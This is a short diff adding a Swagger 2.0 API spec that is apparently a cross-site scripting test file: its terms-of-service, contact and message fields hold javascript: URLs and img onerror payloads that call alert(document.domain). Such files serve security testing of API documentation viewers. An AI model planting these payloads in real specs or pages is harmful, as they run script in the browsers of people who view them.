@@ -1,0 +1,14 @@
+swagger: "2.0"
+info: 
+  title: "Lalala App"
+  description: "Please to click Terms of service"
+  termsOfService: "javascript:alert(document.domain)"
+  produces: "<img src=1 onerror=alert(document.domain)>"
+  consumes: "<img src=1 onerror=alert(document.domain)>"
+  showMessage: "<img src=1 onerror=alert(document.domain)>"
+  onFailure: "<img src=1 onerror=alert(document.domain)>"
+  contact: 
+    name: "API Support"
+    url: "javascript:alert(document.domain)"
+    email: "javascript:alert(document.domain)"
+  version: "1.0.1"
